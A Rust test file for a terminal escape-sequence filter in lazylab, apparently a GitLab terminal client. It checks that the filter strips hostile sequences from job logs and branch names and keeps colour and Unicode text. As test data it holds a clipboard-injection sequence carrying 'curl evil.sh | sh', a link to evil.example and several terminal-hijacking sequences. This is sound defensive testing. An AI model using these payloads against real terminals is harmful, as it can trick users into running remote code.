use base64::prelude::{BASE64_STANDARD, Engine};
use lazylab::termsafe::filter;

/// The sequence that makes a terminal copy `payload` into the system clipboard without a prompt.
fn osc52(payload: &str) -> String {
    format!("\x1b]52;c;{}\x07", BASE64_STANDARD.encode(payload))
}

#[test]
fn a_clipboard_write_is_dropped_and_the_colour_is_kept() {
    // Given: a job log carrying a clipboard write between two coloured lines.
    let log = format!(
        "\x1b[32mJob started\x1b[0m\n{}\n\x1b[31mJob failed\x1b[0m\n",
        osc52("curl evil.sh | sh")
    );

    // When: the filter processes it.
    let got = filter(&log);

    // Then: the clipboard write is gone, and the colour codes and the text remain.
    assert!(!got.contains("]52") && !got.contains('\x07'), "{got:?}");
    for want in [
        "\x1b[32m",
        "\x1b[31m",
        "\x1b[0m",
        "Job started",
        "Job failed",
    ] {
        assert!(got.contains(want), "{want:?} dropped from {got:?}");
    }
}

#[test]
fn every_sequence_that_acts_on_the_terminal_is_dropped() {
    // Given: each sequence class a remote party can carry in through GitLab text.
    let cases = [
        ("clipboard write (OSC 52)", osc52("payload")),
        ("window title (OSC 0)", "\x1b]0;HIJACKED\x07".into()),
        (
            "hyperlink target (OSC 8)",
            "\x1b]8;;https://evil.example\x1b\\text\x1b]8;;\x1b\\".into(),
        ),
        ("device control string", "\x1bP0;1|HIJACKED\x1b\\".into()),
        ("application program command", "\x1b_HIJACKED\x1b\\".into()),
        ("privacy message", "\x1b^HIJACKED\x1b\\".into()),
        ("start of string", "\x1bXHIJACKED\x1b\\".into()),
        ("device status report", "\x1b[6n".into()),
        // XTMODKEYS ends in 'm' as SGR does, but its '>' marker makes it a key mode change.
        ("modify keys (CSI > m)", "\x1b[>4;2m".into()),
        ("private-parameter final m (CSI ? m)", "\x1b[?9m".into()),
        ("clear screen", "\x1b[2J".into()),
        ("cursor home", "\x1b[H".into()),
        ("cursor up", "\x1b[10A".into()),
        ("scroll region", "\x1b[1;5r".into()),
        ("lone escape", "\x1b".into()),
        ("bell", "\x07".into()),
        ("backspace overwrite", "safe\x08x".into()),
        ("C1 introducer", "\u{9b}6n".into()),
        (
            "C1 operating system command",
            "\u{9d}0;HIJACKED\u{9c}".into(),
        ),
        ("C1 device control string", "\u{90}HIJACKED\u{9c}".into()),
    ];
    for (name, input) in cases {
        // When: the filter processes the sequence.
        let got = filter(&input);

        // Then: no escape, bell, backspace or C1 control remains, and no string body.
        assert!(
            !got.contains(['\x1b', '\x07', '\x08', '\u{9b}', '\u{9c}', '\u{9d}']),
            "{name}: {input:?} gave {got:?}"
        );
        assert!(!got.contains("HIJACKED"), "{name}: {input:?} gave {got:?}");
    }
}

#[test]
fn a_coloured_frame_is_kept_byte_for_byte() {
    // Given: a frame of colour, attribute and border glyphs, as a styled panel writes it.
    let frame = "\x1b[1;38;2;196;167;231;48;2;31;29;46m╭──────────╮\x1b[0m\n\
                 \x1b[38;5;189m│ projects │\x1b[0m\n\
                 \x1b[4:3mlazylab\x1b[24m ╰──────────╯";

    // When / Then: the filter returns it unchanged.
    assert_eq!(filter(frame), frame);
}

#[test]
fn plain_text_with_newlines_and_tabs_is_kept() {
    // Given: plain text over several lines.
    let text = "package main\n\tfunc main() {}\n\nline three\n";

    // When / Then: the filter returns it unchanged.
    assert_eq!(filter(text), text);
}

#[test]
fn text_in_any_script_is_kept_whole() {
    // Given: CJK, accented Latin, an emoji and box glyphs.
    let text = "项目 café ✅ 🚀 ╭─┬─╮\n│ pipeline │\n╰─┴─╯";

    // When / Then: the filter returns it unchanged.
    assert_eq!(filter(text), text);
}

#[test]
fn a_sequence_cut_off_by_truncation_is_dropped() {
    // Given: a clipboard write whose terminator a log truncation removed.
    let text = "log output\n\x1b]52;c;Y3VybCBldmlsLnNoIHwgc2g=";

    // When: the filter processes it.
    let got = filter(text);

    // Then: the text before it stays, and nothing of the sequence does.
    assert_eq!(got, "log output\n");
}

#[test]
fn a_control_character_in_a_name_is_dropped_and_the_name_is_kept() {
    // Given: a branch name with a carriage return, a delete and a title change inside it.
    let name = "fix\r/x\x7fy\x1b]2;owned\x07-z";

    // When / Then: only the printable name remains.
    assert_eq!(filter(name), "fix/xy-z");
}
